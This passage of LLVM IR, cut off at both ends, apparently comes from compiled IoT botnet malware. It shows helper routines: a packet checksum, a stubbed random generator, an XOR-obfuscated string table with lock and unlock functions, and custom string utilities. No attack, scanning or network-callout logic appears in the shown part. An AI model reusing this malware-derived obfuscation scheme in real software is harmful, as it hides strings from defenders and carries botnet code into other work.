  %36 = icmp sgt i32 %35, 1
  br i1 %36, label %.lr.ph33, label %._crit_edge34.loopexit.loopexit, !llvm.loop !9

._crit_edge34.loopexit.loopexit:                  ; preds = %.lr.ph33
  br label %._crit_edge34.loopexit

._crit_edge34.loopexit:                           ; preds = %._crit_edge34.loopexit.loopexit, %middle.block
  %.lcssa43 = phi i32 [ %30, %middle.block ], [ %33, %._crit_edge34.loopexit.loopexit ]
  %37 = sub i32 %11, %16
  br label %._crit_edge34

._crit_edge34:                                    ; preds = %._crit_edge34.loopexit, %4
  %38 = phi i8* [ %1, %4 ], [ %scevgep, %._crit_edge34.loopexit ]
  %.026.lcssa = phi i32 [ 0, %4 ], [ %.lcssa43, %._crit_edge34.loopexit ]
  %.0.lcssa = phi i32 [ %3, %4 ], [ %37, %._crit_edge34.loopexit ]
  %39 = icmp eq i32 %.0.lcssa, 1
  br i1 %39, label %40, label %44

; <label>:40:                                     ; preds = %._crit_edge34
  %41 = load i8, i8* %38, align 1
  %42 = zext i8 %41 to i32
  %43 = add i32 %42, %.026.lcssa
  br label %44

; <label>:44:                                     ; preds = %40, %._crit_edge34
  %.1 = phi i32 [ %43, %40 ], [ %.026.lcssa, %._crit_edge34 ]
  %45 = lshr i32 %6, 16
  %46 = and i32 %6, 65535
  %47 = lshr i32 %8, 16
  %48 = and i32 %8, 65535
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i16
  %52 = tail call zeroext i16 @htons(i16 zeroext %51) #11
  %53 = zext i16 %52 to i32
  %54 = zext i16 %2 to i32
  %55 = add nuw nsw i32 %45, %54
  %56 = add nuw nsw i32 %55, %46
  %57 = add nuw nsw i32 %56, %47
  %58 = add nuw nsw i32 %57, %48
  %59 = add i32 %58, %.1
  %60 = add i32 %59, %53
  %61 = lshr i32 %60, 16
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %44
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %63 = phi i32 [ %66, %.lr.ph ], [ %61, %.lr.ph.preheader ]
  %.228 = phi i32 [ %65, %.lr.ph ], [ %60, %.lr.ph.preheader ]
  %64 = and i32 %.228, 65535
  %65 = add nuw nsw i32 %64, %63
  %66 = lshr i32 %65, 16
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %44
  %.2.lcssa = phi i32 [ %60, %44 ], [ %65, %._crit_edge.loopexit ]
  %68 = trunc i32 %.2.lcssa to i16
  %69 = xor i16 %68, -1
  ret i16 %69
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @rand_next() local_unnamed_addr #8 {
  ret i32 0
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_str(i8* nocapture, i32) local_unnamed_addr #9 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.012 = phi i32 [ %12, %.backedge ], [ %1, %.lr.ph.preheader ]
  %.01011 = phi i8* [ %11, %.backedge ], [ %0, %.lr.ph.preheader ]
  %4 = icmp sgt i32 %.012, 3
  br i1 %4, label %5, label %7

; <label>:5:                                      ; preds = %.lr.ph
  %6 = bitcast i8* %.01011 to i32*
  store i32 0, i32* %6, align 4
  br label %.backedge

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp sgt i32 %.012, 1
  br i1 %8, label %9, label %.backedge.thread

; <label>:9:                                      ; preds = %7
  %10 = bitcast i8* %.01011 to i16*
  store i16 0, i16* %10, align 2
  br label %.backedge

.backedge:                                        ; preds = %9, %5
  %.sink14 = phi i64 [ 2, %9 ], [ 4, %5 ]
  %.sink = phi i32 [ -2, %9 ], [ -4, %5 ]
  %11 = getelementptr inbounds i8, i8* %.01011, i64 %.sink14
  %12 = add i32 %.012, %.sink
  %13 = icmp sgt i32 %12, 0
  br i1 %13, label %.lr.ph, label %._crit_edge.loopexit

.backedge.thread:                                 ; preds = %7
  store i8 0, i8* %.01011, align 1
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.backedge.thread, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_unlock_val(i8 zeroext) local_unnamed_addr #9 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @toggle_obf(i8 zeroext) unnamed_addr #9 {
  %2 = zext i8 %0 to i64
  %3 = load i32, i32* @table_key, align 4
  %4 = lshr i32 %3, 8
  %5 = lshr i32 %3, 16
  %6 = lshr i32 %3, 24
  %7 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %2, i32 1
  %8 = load i16, i16* %7, align 8
  %9 = icmp eq i16 %8, 0
  br i1 %9, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %10 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %2, i32 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = load i8*, i8** %10, align 16
  %13 = getelementptr inbounds i8, i8* %12, i64 %indvars.iv
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = xor i32 %15, %3
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %13, align 1
  %18 = load i8*, i8** %10, align 16
  %19 = getelementptr inbounds i8, i8* %18, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = xor i32 %21, %4
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* %19, align 1
  %24 = load i8*, i8** %10, align 16
  %25 = getelementptr inbounds i8, i8* %24, i64 %indvars.iv
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %5
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* %25, align 1
  %30 = load i8*, i8** %10, align 16
  %31 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = xor i32 %33, %6
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %31, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %36 = load i16, i16* %7, align 8
  %37 = zext i16 %36 to i64
  %38 = icmp slt i64 %indvars.iv.next, %37
  br i1 %38, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_lock_val(i8 zeroext) local_unnamed_addr #9 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #9 {
  %3 = sext i32 %0 to i64
  %4 = icmp eq i32* %1, null
  br i1 %4, label %9, label %5

; <label>:5:                                      ; preds = %2
  %6 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %3, i32 1
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  store i32 %8, i32* %1, align 4
  br label %9

; <label>:9:                                      ; preds = %2, %5
  %10 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %3, i32 0
  %11 = load i8*, i8** %10, align 16
  ret i8* %11
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_strlen(i8* nocapture readonly) local_unnamed_addr #5 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.03 = phi i32 [ %5, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i8* [ %4, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %4 = getelementptr inbounds i8, i8* %.012, i64 1
  %5 = add nuw nsw i32 %.03, 1
  %6 = load i8, i8* %4, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i32 [ 0, %1 ], [ %5, %._crit_edge.loopexit ]
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define signext i8 @util_strncmp(i8* nocapture readonly, i8* nocapture readonly, i32) local_unnamed_addr #5 {
  %4 = tail call i32 @util_strlen(i8* %0)
  %5 = tail call i32 @util_strlen(i8* %1)
  %6 = icmp slt i32 %4, %2
  %7 = icmp slt i32 %5, %2
  %or.cond = or i1 %6, %7
  br i1 %or.cond, label %.loopexit, label %.preheader.preheader

.preheader.preheader:                             ; preds = %3
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %9
  %.011 = phi i8* [ %13, %9 ], [ %1, %.preheader.preheader ]
  %.010 = phi i32 [ %10, %9 ], [ %2, %.preheader.preheader ]
  %.09 = phi i8* [ %11, %9 ], [ %0, %.preheader.preheader ]
  %8 = icmp eq i32 %.010, 0
  br i1 %8, label %.loopexit.loopexit, label %9

; <label>:9:                                      ; preds = %.preheader
  %10 = add nsw i32 %.010, -1
  %11 = getelementptr inbounds i8, i8* %.09, i64 1
  %12 = load i8, i8* %.09, align 1
  %13 = getelementptr inbounds i8, i8* %.011, i64 1
  %14 = load i8, i8* %.011, align 1
  %15 = icmp eq i8 %12, %14
  br i1 %15, label %.preheader, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %9, %.preheader
  %.0.ph = phi i8 [ 1, %.preheader ], [ 0, %9 ]
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %3
  %.0 = phi i8 [ 0, %3 ], [ %.0.ph, %.loopexit.loopexit ]
  ret i8 %.0
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define signext i8 @util_strcmp(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #5 {
  %3 = tail call i32 @util_strlen(i8* %0)
  %4 = tail call i32 @util_strlen(i8* %1)
  %5 = icmp eq i32 %3, %4
  br i1 %5, label %.preheader.preheader, label %.loopexit

.preheader.preheader:                             ; preds = %2
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %7
  %.09 = phi i8* [ %9, %7 ], [ %0, %.preheader.preheader ]
  %.08 = phi i8* [ %11, %7 ], [ %1, %.preheader.preheader ]
  %.07 = phi i32 [ %8, %7 ], [ %3, %.preheader.preheader ]
  %6 = icmp eq i32 %.07, 0
  br i1 %6, label %.loopexit.loopexit, label %7

; <label>:7:                                      ; preds = %.preheader
  %8 = add nsw i32 %.07, -1
  %9 = getelementptr inbounds i8, i8* %.09, i64 1
  %10 = load i8, i8* %.09, align 1
  %11 = getelementptr inbounds i8, i8* %.08, i64 1
  %12 = load i8, i8* %.08, align 1
  %13 = icmp eq i8 %10, %12
  br i1 %13, label %.preheader, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %7, %.preheader
  %.0.ph = phi i8 [ 1, %.preheader ], [ 0, %7 ]
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %2
  %.0 = phi i8 [ 0, %2 ], [ %.0.ph, %.loopexit.loopexit ]
  ret i8 %.0
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @util_strcpy(i8* nocapture, i8* nocapture readonly) local_unnamed_addr #9 {
  %3 = tail call i32 @util_strlen(i8* %1)
  %4 = add nsw i32 %3, 1
  tail call void @util_memcpy(i8* %0, i8* %1, i32 %4)
  ret i32 %3
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @util_memcpy(i8* nocapture, i8* nocapture readonly, i32) local_unnamed_addr #9 {
  %4 = icmp eq i32 %2, 0
  br i1 %4, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  %5 = add i32 %2, -1
  %6 = zext i32 %5 to i64
  %7 = add nuw nsw i64 %6, 1
  %min.iters.check = icmp ult i64 %7, 32
  br i1 %min.iters.check, label %.lr.ph.preheader19, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %n.vec = and i64 %7, 8589934560
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.lr.ph.preheader19, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %8 = add i32 %2, -1
  %9 = zext i32 %8 to i64
  %10 = add nuw nsw i64 %9, 1
  %scevgep = getelementptr i8, i8* %0, i64 %10
  %scevgep9 = getelementptr i8, i8* %1, i64 %10
  %bound0 = icmp ugt i8* %scevgep9, %0
  %bound1 = icmp ugt i8* %scevgep, %1
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = getelementptr i8, i8* %1, i64 %n.vec
  %ind.end11 = getelementptr i8, i8* %0, i64 %n.vec
  %cast.crd = trunc i64 %n.vec to i32
  %ind.end13 = sub i32 %2, %cast.crd
  br i1 %memcheck.conflict, label %.lr.ph.preheader19, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %11 = add nsw i64 %n.vec, -32
  %12 = lshr exact i64 %11, 5
  %13 = add nuw nsw i64 %12, 1
  %xtraiter20 = and i64 %13, 3
  %lcmp.mod21 = icmp eq i64 %xtraiter20, 0
  br i1 %lcmp.mod21, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter22 = phi i64 [ %prol.iter22.sub, %vector.body.prol ], [ %xtraiter20, %vector.body.prol.preheader ]
  %next.gep.prol = getelementptr i8, i8* %1, i64 %index.prol
  %next.gep15.prol = getelementptr i8, i8* %0, i64 %index.prol
  %14 = bitcast i8* %next.gep.prol to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %14, align 1, !alias.scope !10
  %15 = getelementptr i8, i8* %next.gep.prol, i64 16
  %16 = bitcast i8* %15 to <16 x i8>*
  %wide.load18.prol = load <16 x i8>, <16 x i8>* %16, align 1, !alias.scope !10
  %17 = bitcast i8* %next.gep15.prol to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %17, align 1, !alias.scope !13, !noalias !10
  %18 = getelementptr i8, i8* %next.gep15.prol, i64 16
  %19 = bitcast i8* %18 to <16 x i8>*
  store <16 x i8> %wide.load18.prol, <16 x i8>* %19, align 1, !alias.scope !13, !noalias !10
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter22.sub = add i64 %prol.iter22, -1
  %prol.iter22.cmp = icmp eq i64 %prol.iter22.sub, 0
  br i1 %prol.iter22.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !15

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %20 = icmp ult i64 %11, 96
  br i1 %20, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %next.gep = getelementptr i8, i8* %1, i64 %index
  %next.gep15 = getelementptr i8, i8* %0, i64 %index
  %21 = bitcast i8* %next.gep to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %21, align 1, !alias.scope !10
  %22 = getelementptr i8, i8* %next.gep, i64 16
  %23 = bitcast i8* %22 to <16 x i8>*
  %wide.load18 = load <16 x i8>, <16 x i8>* %23, align 1, !alias.scope !10
  %24 = bitcast i8* %next.gep15 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %24, align 1, !alias.scope !13, !noalias !10
  %25 = getelementptr i8, i8* %next.gep15, i64 16
  %26 = bitcast i8* %25 to <16 x i8>*
  store <16 x i8> %wide.load18, <16 x i8>* %26, align 1, !alias.scope !13, !noalias !10
  %index.next = add i64 %index, 32
  %next.gep.1 = getelementptr i8, i8* %1, i64 %index.next
  %next.gep15.1 = getelementptr i8, i8* %0, i64 %index.next
  %27 = bitcast i8* %next.gep.1 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %27, align 1, !alias.scope !10
  %28 = getelementptr i8, i8* %next.gep.1, i64 16
  %29 = bitcast i8* %28 to <16 x i8>*
  %wide.load18.1 = load <16 x i8>, <16 x i8>* %29, align 1, !alias.scope !10
  %30 = bitcast i8* %next.gep15.1 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %30, align 1, !alias.scope !13, !noalias !10
  %31 = getelementptr i8, i8* %next.gep15.1, i64 16
  %32 = bitcast i8* %31 to <16 x i8>*
  store <16 x i8> %wide.load18.1, <16 x i8>* %32, align 1, !alias.scope !13, !noalias !10
  %index.next.1 = add i64 %index, 64
  %next.gep.2 = getelementptr i8, i8* %1, i64 %index.next.1
  %next.gep15.2 = getelementptr i8, i8* %0, i64 %index.next.1
  %33 = bitcast i8* %next.gep.2 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %33, align 1, !alias.scope !10
  %34 = getelementptr i8, i8* %next.gep.2, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  %wide.load18.2 = load <16 x i8>, <16 x i8>* %35, align 1, !alias.scope !10
  %36 = bitcast i8* %next.gep15.2 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %36, align 1, !alias.scope !13, !noalias !10
  %37 = getelementptr i8, i8* %next.gep15.2, i64 16
  %38 = bitcast i8* %37 to <16 x i8>*
  store <16 x i8> %wide.load18.2, <16 x i8>* %38, align 1, !alias.scope !13, !noalias !10
  %index.next.2 = add i64 %index, 96
  %next.gep.3 = getelementptr i8, i8* %1, i64 %index.next.2
  %next.gep15.3 = getelementptr i8, i8* %0, i64 %index.next.2
  %39 = bitcast i8* %next.gep.3 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %39, align 1, !alias.scope !10
  %40 = getelementptr i8, i8* %next.gep.3, i64 16
  %41 = bitcast i8* %40 to <16 x i8>*
  %wide.load18.3 = load <16 x i8>, <16 x i8>* %41, align 1, !alias.scope !10
  %42 = bitcast i8* %next.gep15.3 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %42, align 1, !alias.scope !13, !noalias !10
  %43 = getelementptr i8, i8* %next.gep15.3, i64 16
  %44 = bitcast i8* %43 to <16 x i8>*
  store <16 x i8> %wide.load18.3, <16 x i8>* %44, align 1, !alias.scope !13, !noalias !10
  %index.next.3 = add i64 %index, 128
  %45 = icmp eq i64 %index.next.3, %n.vec
  br i1 %45, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !17

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %7, %n.vec
  br i1 %cmp.n, label %._crit_edge, label %.lr.ph.preheader19

.lr.ph.preheader19:                               ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.lr.ph.preheader
  %.08.ph = phi i8* [ %1, %vector.memcheck ], [ %1, %min.iters.checked ], [ %1, %.lr.ph.preheader ], [ %ind.end, %middle.block ]
  %.047.ph = phi i8* [ %0, %vector.memcheck ], [ %0, %min.iters.checked ], [ %0, %.lr.ph.preheader ], [ %ind.end11, %middle.block ]
  %.056.ph = phi i32 [ %2, %vector.memcheck ], [ %2, %min.iters.checked ], [ %2, %.lr.ph.preheader ], [ %ind.end13, %middle.block ]
  %46 = add i32 %.056.ph, -1
  %xtraiter = and i32 %.056.ph, 7
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader19
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %.lr.ph.prol, %.lr.ph.prol.preheader
  %.08.prol = phi i8* [ %48, %.lr.ph.prol ], [ %.08.ph, %.lr.ph.prol.preheader ]
  %.047.prol = phi i8* [ %50, %.lr.ph.prol ], [ %.047.ph, %.lr.ph.prol.preheader ]
  %.056.prol = phi i32 [ %47, %.lr.ph.prol ], [ %.056.ph, %.lr.ph.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph.prol ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %47 = add nsw i32 %.056.prol, -1
  %48 = getelementptr inbounds i8, i8* %.08.prol, i64 1
  %49 = load i8, i8* %.08.prol, align 1
  %50 = getelementptr inbounds i8, i8* %.047.prol, i64 1
  store i8 %49, i8* %.047.prol, align 1
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !18

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %.lr.ph.prol
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader19, %.lr.ph.prol.loopexit.unr-lcssa
  %.08.unr = phi i8* [ %.08.ph, %.lr.ph.preheader19 ], [ %48, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.047.unr = phi i8* [ %.047.ph, %.lr.ph.preheader19 ], [ %50, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.056.unr = phi i32 [ %.056.ph, %.lr.ph.preheader19 ], [ %47, %.lr.ph.prol.loopexit.unr-lcssa ]
  %51 = icmp ult i32 %46, 7
  br i1 %51, label %._crit_edge.loopexit, label %.lr.ph.preheader19.new

.lr.ph.preheader19.new:                           ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader19.new
  %.08 = phi i8* [ %.08.unr, %.lr.ph.preheader19.new ], [ %74, %.lr.ph ]
  %.047 = phi i8* [ %.047.unr, %.lr.ph.preheader19.new ], [ %76, %.lr.ph ]
  %.056 = phi i32 [ %.056.unr, %.lr.ph.preheader19.new ], [ %73, %.lr.ph ]
  %52 = getelementptr inbounds i8, i8* %.08, i64 1
  %53 = load i8, i8* %.08, align 1
  %54 = getelementptr inbounds i8, i8* %.047, i64 1
  store i8 %53, i8* %.047, align 1
  %55 = getelementptr inbounds i8, i8* %.08, i64 2
  %56 = load i8, i8* %52, align 1
  %57 = getelementptr inbounds i8, i8* %.047, i64 2
  store i8 %56, i8* %54, align 1
  %58 = getelementptr inbounds i8, i8* %.08, i64 3
  %59 = load i8, i8* %55, align 1
  %60 = getelementptr inbounds i8, i8* %.047, i64 3
  store i8 %59, i8* %57, align 1
  %61 = getelementptr inbounds i8, i8* %.08, i64 4
  %62 = load i8, i8* %58, align 1
  %63 = getelementptr inbounds i8, i8* %.047, i64 4
  store i8 %62, i8* %60, align 1
  %64 = getelementptr inbounds i8, i8* %.08, i64 5
  %65 = load i8, i8* %61, align 1
  %66 = getelementptr inbounds i8, i8* %.047, i64 5
  store i8 %65, i8* %63, align 1
  %67 = getelementptr inbounds i8, i8* %.08, i64 6
  %68 = load i8, i8* %64, align 1
  %69 = getelementptr inbounds i8, i8* %.047, i64 6
  store i8 %68, i8* %66, align 1
  %70 = getelementptr inbounds i8, i8* %.08, i64 7
  %71 = load i8, i8* %67, align 1
  %72 = getelementptr inbounds i8, i8* %.047, i64 7
  store i8 %71, i8* %69, align 1
  %73 = add nsw i32 %.056, -8
  %74 = getelementptr inbounds i8, i8* %.08, i64 8
  %75 = load i8, i8* %70, align 1
  %76 = getelementptr inbounds i8, i8* %.047, i64 8
  store i8 %75, i8* %72, align 1
  %77 = icmp eq i32 %73, 0
  br i1 %77, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph, !llvm.loop !19

._crit_edge.loopexit.unr-lcssa:                   ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %middle.block, %3
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @util_zero(i8* nocapture, i32) local_unnamed_addr #9 {
  %3 = icmp eq i32 %1, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -1
  %5 = zext i32 %4 to i64
  %6 = add nuw nsw i64 %5, 1
  call void @llvm.memset.p0i8.i64(i8* %0, i8 0, i64 %6, i32 1, i1 false)
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph.preheader, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_atoi(i8* nocapture readonly, i32) local_unnamed_addr #5 {
  br label %3

; <label>:3:                                      ; preds = %3, %2
  %.0 = phi i8* [ %0, %2 ], [ %4, %3 ]
  %4 = getelementptr inbounds i8, i8* %.0, i64 1
  %5 = load i8, i8* %.0, align 1
  %6 = tail call fastcc i32 @util_isspace(i8 signext %5)
  %7 = icmp eq i32 %6, 0
  br i1 %7, label %8, label %3

; <label>:8:                                      ; preds = %3
  switch i8 %5, label %12 [
    i8 45, label %9
    i8 43, label %.sink.split
  ]

; <label>:9:                                      ; preds = %8
  br label %.sink.split

.sink.split:                                      ; preds = %8, %9
  %.034.ph = phi i1 [ true, %9 ], [ false, %8 ]
  %10 = getelementptr inbounds i8, i8* %.0, i64 2
  %11 = load i8, i8* %4, align 1
  br label %12

; <label>:12:                                     ; preds = %8, %.sink.split
  %.035.in = phi i8 [ %11, %.sink.split ], [ %5, %8 ]
  %.034 = phi i1 [ %.034.ph, %.sink.split ], [ false, %8 ]
  %.1 = phi i8* [ %10, %.sink.split ], [ %4, %8 ]
  %13 = select i1 %.034, i64 -9223372036854775808, i64 9223372036854775807
  %14 = sext i32 %1 to i64
  %15 = urem i64 %13, %14
  %16 = trunc i64 %15 to i32
  %17 = udiv i64 %13, %14
  br label %18

; <label>:18:                                     ; preds = %43, %12
  %.038 = phi i64 [ 0, %12 ], [ %.139, %43 ]
  %.136.in = phi i8 [ %.035.in, %12 ], [ %45, %43 ]
  %.032 = phi i32 [ 0, %12 ], [ %.133, %43 ]
  %.2 = phi i8* [ %.1, %12 ], [ %44, %43 ]
  %.136 = sext i8 %.136.in to i32
  %19 = tail call fastcc i32 @util_isdigit(i8 signext %.136.in)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %23, label %21

; <label>:21:                                     ; preds = %18
  %22 = add nsw i32 %.136, -48
  br label %31

; <label>:23:                                     ; preds = %18
  %24 = tail call fastcc i32 @util_isalpha(i8 signext %.136.in)
  %25 = icmp eq i32 %24, 0
  br i1 %25, label %46, label %26

; <label>:26:                                     ; preds = %23
  %27 = tail call fastcc i32 @util_isupper(i8 signext %.136.in)
  %28 = icmp ne i32 %27, 0
  %29 = select i1 %28, i32 55, i32 87
  %30 = sub nsw i32 %.136, %29
  br label %31

; <label>:31:                                     ; preds = %26, %21
  %.237 = phi i32 [ %22, %21 ], [ %30, %26 ]
  %32 = icmp slt i32 %.237, %1
  br i1 %32, label %33, label %46

; <label>:33:                                     ; preds = %31
  %34 = icmp slt i32 %.032, 0
  %35 = icmp ugt i64 %.038, %17
  %or.cond = or i1 %35, %34
  br i1 %or.cond, label %43, label %36

; <label>:36:                                     ; preds = %33
  %37 = icmp eq i64 %.038, %17
  %38 = icmp sgt i32 %.237, %16
  %or.cond41 = and i1 %37, %38
  br i1 %or.cond41, label %43, label %39

; <label>:39:                                     ; preds = %36
  %40 = mul i64 %.038, %14
  %41 = sext i32 %.237 to i64
  %42 = add i64 %41, %40
  br label %43

; <label>:43:                                     ; preds = %33, %36, %39
  %.139 = phi i64 [ %42, %39 ], [ %17, %36 ], [ %.038, %33 ]
  %.133 = phi i32 [ 1, %39 ], [ -1, %36 ], [ -1, %33 ]
  %44 = getelementptr inbounds i8, i8* %.2, i64 1
  %45 = load i8, i8* %.2, align 1
  br label %18

; <label>:46:                                     ; preds = %31, %23
  %47 = icmp slt i32 %.032, 0
  %48 = sub i64 0, %.038
  %..038 = select i1 %.034, i64 %48, i64 %.038
  %.240 = select i1 %47, i64 %13, i64 %..038
  %49 = trunc i64 %.240 to i32
  ret i32 %49
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define internal fastcc i32 @util_isspace(i8 signext) unnamed_addr #8 {
  switch i8 %0, label %2 [
    i8 32, label %3
    i8 9, label %3
    i8 10, label %3
  ]

